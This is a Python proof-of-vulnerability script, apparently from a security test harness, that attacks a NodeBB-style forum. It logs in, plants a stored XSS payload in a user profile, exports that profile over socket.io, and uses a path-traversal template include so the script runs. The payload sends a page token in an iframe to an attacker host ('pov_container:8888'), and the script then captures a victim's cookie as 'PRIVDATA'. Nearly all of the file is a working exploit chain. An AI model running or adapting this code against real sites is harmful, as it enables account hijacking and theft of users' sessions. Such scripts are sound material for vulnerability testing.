from re import T
import sys
import os
import subprocess
import signal
import time
from pwn import *

import socketio

import requests
from datetime import datetime as dt
import socket
import hashlib
import json
from bs4 import BeautifulSoup
import random

import poller_utility

def handler(signum, frame):
    print('Process timeout.')
    print('[FAILED] POV Failed')
    exit(0)

def getConfig(conn, headers=""):
    address=BASEADDR+'/api/config'
    return conn.get(address, headers=headers)

def doLogin(conn, username, password, headers=""):
    address=BASEADDR+'/api/v3/utilities/login'
    result = conn.post(address, headers=headers, data={'username':username, 'password': password})
    return result

def getHomepage(conn, headers=""):
    address=BASEADDR+'/?loggedin=true'
    result = conn.get(address, headers=headers)
    return result

def getUserpage(conn, headers=""):
    address=BASEADDR+'/user/newuser'
    result = conn.get(address, headers=headers)
    return result

def editProfile(conn, username, uid, payload, headers=""):
    address=BASEADDR+'/api/v3/users/'+str(uid)
    result = conn.put(address, headers=headers, data={"fullname":"","website":"","location":"","birthday":"","groupTitle":"[\"\"]","aboutme":payload,"signature":"","uid":uid})
    return result

def getCookie(response):
    rh=json.dumps(response.headers.__dict__['_store'])
    rhj=json.loads(rh)
    sc_rhj=rhj['set-cookie']
    cookie=sc_rhj[1].split(';')[0]
    return cookie

def getCRSFToken(response):
    configJson=json.loads(response.text)
    return configJson['csrf_token']

def getCRSFTokenSoup(response):
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find('input',attrs = {'name':'_csrf'})['value']

def checkResult(response):
    if response.status_code != 200:
        print("Status Code failure", str(response.status_code), flush=True)
        print('[FAILED] POV Failed', flush=True)
        exit(0)


def main():
    global HOST
    global PORT
    global BASEADDR
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)
    BASEADDR='http://{}:{}'.format(HOST, PORT)
    SOCKETBASEADDR=BASEADDR+'/socket.io/'
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(30)

    headers={
    'Host': HOST + ' :' + str(PORT),
    'sec-ch-usa': '"Chromium";v="95", ";Not A Brand";v="99"',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'sec-ch-ua-platform': '"Linux"',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': '',
    'Connection': 'close',
    }

    username="chess"
    password="chess123"
    uid=27
    c_session = requests.Session()

    ## GET FORUM CONFIGURATION
    result=getConfig(c_session, headers)
    print("Get Config:", result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFToken(result)
    ## LOGIN INTO USER
    result=doLogin(c_session, username, password, headers)
    print("Post Login:", result.status_code, flush=True)
    checkResult(result)
    headers['Cookie']=getCookie(result)
    del headers['x-csrf-token']
    ## GET USER'S HOMEPAGE
    result=getHomepage(c_session, headers)
    print("Get Homepage:", result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFTokenSoup(result)
    ## EDIT USER'S PROFILE WITH JAVASCRIPT PAYLOAD
    payload="\"/> <script>alert(1);window.onload=function(){document.write(\"<iframe src='http://pov_container:8888/?c=\"+document.getElementsByTagName('input')[1].getAttribute('value')+\"'></iframe>\")};</script>////"
    ## window.onload=function(){document.write(\"<iframe src='http://pov_container:8888/?c=poop'></iframe>\")};</script>////"
    ## window.onload=function(){document.write(\"<iframe src='http://pov_container:8888/?c=\"+document.getElementsByTagName('input')[1].getAttribute('value')+\"'></iframe>\")};</script>////"
    result=editProfile(c_session, username, uid, payload, headers)
    print("Put Profile with Javascript Payload:", result.status_code, flush=True)
    checkResult(result)
    ## SOCKET.IO COMMS FOR EXPORTING USER PROFILE - CREATES FILE ON SERVER: uid_profile.json, where uid is user's UID
    hdrs_json=json.dumps(headers)
    sio = socketio.Client()
    @sio.event
    def connect():
        print('connection established', flush=True)
    @sio.event
    def disconnect():
        print('disconnected from server', flush=True)
    @sio.on('*')
    def catch_all(event, data):
        print('I received a message!', data, flush=True)
        pass
    sio.connect(SOCKETBASEADDR, headers)
    time.sleep(0.5)
    sio.emit("meta.rooms.enter",{"enter":"categories"})
    time.sleep(0.5)
    useruid="user/"+str(uid)
    sio.emit("meta.rooms.enter",{"enter":useruid})
    time.sleep(0.5)
    sio.emit("user.exportProfile",{"uid":uid})
    time.sleep(3)
    sio.disconnect()
    ## EDIT USER'S PROFILE WITH JAVASCRIPT PAYLOAD
    payload="[[../../../export/" + str(uid) + "_profile:user.aboutme]]"
    result=editProfile(c_session, username, uid, payload, headers)
    print("Put Profile with Javascript Payload:", result.status_code, flush=True)
    checkResult(result)
    print(result)
    c_session.close()

    print("Waiting on attacker server for a user to connect", flush=True)
    ## RUN CLIENT VICTIM TO ACCESS PROFILE PAGE
    subprocess.Popen(["node", "client.js"])
    ## RUN SERVER FOR VICTIM TO CALLBACK TO
    web_server_process = subprocess.run(['python3', 'web_server.py'], capture_output=True, encoding="utf")

    result_lines = web_server_process.stdout.split("\n")
    #print("Return Code : {}".format(web_server_process.returncode))
    #print("\nResult Output Stream : ")
    cookie=""
    for line in result_lines:
        if line.find("GOT COOKIE:") != -1:
            cookie=line[line.find("GOT COOKIE")+12:]
        #print(line)
    if web_server_process.returncode == 13 and cookie != "":
        print ('PRIVDATA='+cookie)
        print('[SUCCESS] POV Succeeded', flush=True)
        exit(0)
    print('[FAILED] POV Failed', flush=True)

if __name__ == '__main__':
    main()
